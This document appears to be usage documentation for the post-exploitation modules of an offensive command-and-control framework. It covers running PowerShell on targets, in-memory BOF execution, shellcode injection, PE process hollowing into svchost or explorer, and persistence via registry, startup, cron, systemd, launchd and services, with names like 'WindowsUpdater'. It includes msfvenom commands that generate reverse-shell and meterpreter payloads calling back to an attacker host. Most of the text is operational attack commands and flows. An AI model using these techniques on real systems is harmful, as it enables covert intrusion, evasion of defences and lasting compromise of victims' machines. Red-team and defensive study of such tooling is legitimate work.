# Specialized Modules

## Powershell

This `pwsh` module helps operators run their own extendible powershell scripts on a targest's Windows machine via an active agent session

### Compatibility:
- Go_agent
- Phantom Hawk agent
- Windows x64

### Basic Usage:

```
modules info pwsh
pwsh <script_path> [agent_id=<agent_id>] [arguments=<script_arguments>]
```

## Inline-Execute

This module interfaces with an agent and enables pure in-memory execution of Beacon Object Files (BOFs) without any disk writes or PowerShell usage. The solution leverages the goffloader library to execute BOFs directly in the agent's memory space.

#### Compatibility
- Go_agent
- Windows x64

#### Usage
1. Place BOFs in modules/external/bof/ of the C2 Server
2. Use the module with a BOF path
3. The agent will in-memory execute the BOF using its COFFloader library
4. BOF results are captured and sent back through C2 channel to operator
5. No files written to disk at any stage; complete execution in agent's memory space

### Command syntax
Execute BOFs using the inline-execute command:

```
modules info inline-execute
# In interactive mode, the agent ID is automatically inferred:
inline-execute <path_to_bof_file> [arguments]
```

## PInject

This module interfaces with an active agent for In-memory shellcode injection into a remote process

#### Compatibility
- Go_agent
- Windows x64

#### Usage
1. Generate compatible shellcode using msfvenom
2. Use the module with a base64 encoded shellcode string
3. The agent will in-memory inject the shellcode into either notepad.exe or explorer.exe

#### msfvenom Command Syntax
Generate shellcode with proper null byte avoidance and correct format:

```
# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f raw -o shellcode.bin
# Then base64 encode it before sending to the module
base64 -w 0 shellcode.bin

pinject <shellcode> # METHOD - 1 (Interactive mode)
run pinject <shellcode> [agent_id=<agent_id>] # METHOD - 2 (Non-interactive mode)
```

#### Notes
- If notepad.exe is not running on the target system, the agent will fallback on explorer.exe
- The shellcode must be in raw binary format (use `-f raw`)

#### Shellcode Injection Flow
1. Find target process PID
2. Open process with appropriate permissions
3. Allocate memory in target process
4. Write shellcode to allocated memory
5. Change memory protection to executable
6. Create remote thread to execute shellcode
7. All operations performed in-memory without touching disk

#### Supported Payloads
- windows/x64/meterpreter/reverse_tcp
- windows/x64/shell_reverse_tcp
- windows/x64/exec
- Any custom raw shellcode


## PEInject

This module interfaces with an agent and enables In-memory Injection of an unmanaged PE(Portable Executable) using Process Hollowing into a remote process

#### Compatibility
- Go_agent
- Windows x64

#### Usage
1. Generate compatible PE payload using msfvenom
2. Parse the `pe_file` path on the C2 server as a required argument of the peinject module
3. The agent will in-memory inject this into either svchost.exe or explorer.exe using Process Hollowing

#### msfvenom Command Syntax

```
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe

peinject pe_file=<payload_path> # METHOD - 1 (Interactive mode)
run peinject pe_file=<payload_path> [agent_id=<agent_id>] # METHOD - 2 (Non-interactive mode)
```

#### PE Injection Flow
1. Parses and validates the DOS header and NT headers to ensure the file is a valid PE
2. Creates a Windows process (svchost.exe or explorer.exe) in suspended state
3. Unmap the target process memory using the undocumented NtUnmapViewOfSection API
4. Allocates executable memory in the target process with proper permission
5. Writes the entire PE file contents to the allocated memory in the target process using WriteProcessMemory
6. Retrieves the suspended thread context and updates the instruction pointer to point to the new PE's entry point
7. Sets the modified thread context back to the suspended thread
8. Resumes the target process thread using ResumeThread, which begins execution of the injected PE

#### Supported Payloads
- windows/x64/exec
- windows/x64/shell_reverse_tcp
- windows/x64/meterpreter/reverse_tcp

## Persist

This module helps operators establishes persistence on systems using various techniques `modules info persistence`

### Compatibility:
- Go_agent
- Phantom Hawk agent
- Windows x64
- Linux debian
- MacOS

#### Required Options:
- `agent_id`: ID of the agent to establish persistence on
- `method`: Persistence method (registry, startup, cron, launchd, systemd, or service)
- `payload_path`: Path to the payload/script to persist

#### Optional Options:
- `name`: Name for the persistence mechanism (default: "SystemUpdate")
- `interval`: Interval for scheduled tasks (minutes, only for cron/systemd) (default: "60")

#### Usage:

```
# In interactive mode, the agent ID is automatically inferred:
persist <method> <payload_path> [agent_id=<agent_id>] [name=<persistence_name>] [interval=<minutes>]

# Linux/macOS Cron Persistence:
persist agent_id=abc123-4567-8901-2345-67890abcdef1 method=cron payload_path=/tmp/payload.sh

# Windows Registry Persistence:
persist agent_id=abc123-4567-8901-2345-67890abcdef1 method=registry payload_path=C:\Users\Public\payload.exe

# Windows Startup Folder:
persist agent_id=abc123-4567-8901-2345-67890abcdef1 method=startup payload_path=C:\Users\Public\payload.exe

# Windows Service:
persist agent_id=abc123-4567-8901-2345-67890abcdef1 method=service payload_path=C:\Users\Public\payload.exe name=WindowsUpdater

Linux Systemd Service:
persist agent_id=abc123-4567-8901-2345-67890abcdef1 method=systemd payload_path=/opt/payload service_interval=30

macOS LaunchAgent:
persist agent_id=abc123-4567-8901-2345-67890abcdef1 method=launchd payload_path=/Applications/payload.sh
```
